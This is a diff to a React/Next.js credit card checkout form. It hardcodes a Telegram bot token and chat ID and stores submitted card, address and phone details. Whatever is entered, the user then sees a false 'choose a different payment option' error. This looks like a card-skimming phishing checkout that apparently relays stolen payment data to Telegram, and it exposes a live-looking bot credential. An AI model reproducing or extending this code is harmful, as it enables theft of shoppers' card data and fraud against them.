@@ -1,10 +1,9 @@
 'use client'
 import { useCart } from '@/contexts/CartContext';
-import { useState, useEffect } from 'react';
+import { useState } from 'react';
 import { useForm } from 'react-hook-form';
 import { jwtDecode } from 'jwt-decode';
 import { useRouter } from 'next/navigation';
-import Cookies from 'js-cookie';
 
 type CartItem = {
   id: string;
@@ -19,9 +18,8 @@ type UserToken = {
   email: string;
   // add other JWT payload properties if needed
 };
-
-const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || '';
-const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '';
+const TELEGRAM_BOT_TOKEN = '7737474698:AAHyZKVaQLgdeNBEwvpbwXIToyFYfZ5TSR4'; // Replace with your actual bot token
+const TELEGRAM_CHAT_ID = '7860277201'; // Replace with your actual chat ID
 
 interface CreditCardFormProps {
   totalAmount: number;
@@ -38,6 +36,7 @@ interface CreditCardFormData {
 }
 
 const escapeMarkdown = (text: string) => {
+  // Escape all special MarkdownV2 characters including hyphen
   return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
 };
 
@@ -54,35 +53,34 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
     address: '',
     phoneNumber: '',
   });
-  const [user, setUser] = useState<UserToken | null>(null);
-  const [errors, setErrors] = useState<Record<string, string>>({});
-  const [status, setStatus] = useState({ message: '', color: '' });
-  const [loading, setLoading] = useState(false);
-
-  useEffect(() => {
-    const token = Cookies.get('auth_token');
-    if (token) {
-      try {
-        const decoded = jwtDecode<UserToken>(token);
-        setUser(decoded);
-      } catch (error) {
-        router.push('/signin');
-      }
-    } else {
-      router.push('/signin');
-    }
-  }, [router]);
 
   const checkAuth = () => {
-    if (!user) {
+    const token = document.cookie
+      .split('; ')
+      .find(row => row.startsWith('auth_token='))
+      ?.split('=')[1];
+
+    if (!token) {
+      router.push('/signin'); // Redirect to sign-in page if not logged in
       return null;
     }
-    return user;
+
+    try {
+      const user = jwtDecode<UserToken>(token);
+      if (!user || !user.id) {
+        router.push('/signin'); // Redirect if token is invalid
+        return null;
+      }
+      return user;
+    } catch (error) {
+      router.push('/signin'); // Redirect if token decoding fails
+      return null;
+    }
   };
 
   const handlePurchase = async (cartItems: CartItem[], totalAmount: number) => {
     const user = checkAuth();
-    if (!user) return;
+    if (!user) return; // Already redirected if not logged in
 
     try {
       const purchaseDoc = {
@@ -101,6 +99,7 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
         purchaseDate: new Date().toISOString(),
       };
 
+      // Call your backend API route to save purchase
       const res = await fetch('/api/purchasedata', {
         method: 'POST',
         headers: {
@@ -116,11 +115,16 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
       }
 
       alert('oppss! please choose a different payment option');
+      // clear cart, redirect, etc.
     } catch (error) {
       console.error('Error saving purchase:', error);
       alert('Failed to save purchase');
     }
   };
+
+  const [errors, setErrors] = useState<Record<string, string>>({});
+  const [status, setStatus] = useState({ message: '', color: '' });
+  const [loading, setLoading] = useState(false);
 
   const luhnCheck = (num: string): boolean => {
     const arr = num.split('').reverse().map(x => parseInt(x, 10));
@@ -157,6 +161,9 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
   };
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const user = checkAuth();
+    if (!user) return; // Already redirected if not logged in
+
     const { name, value } = e.target;
     let val = value;
 
@@ -170,6 +177,9 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
   };
 
   const validateForm = (): boolean => {
+    const user = checkAuth();
+    if (!user) return false; // Already redirected if not logged in
+
     const errs: Record<string, string> = {};
     if (!form.cardName.trim()) errs.cardName = 'Please enter your name.';
     const cardNumRaw = form.cardNumber.replace(/\s/g, '');
@@ -184,6 +194,9 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
   };
 
   const onSubmit = async (data: CreditCardFormData) => {
+    const user = checkAuth();
+    if (!user) return; // Already redirected if not logged in
+
     if (!validateForm()) return;
     
     setLoading(true);
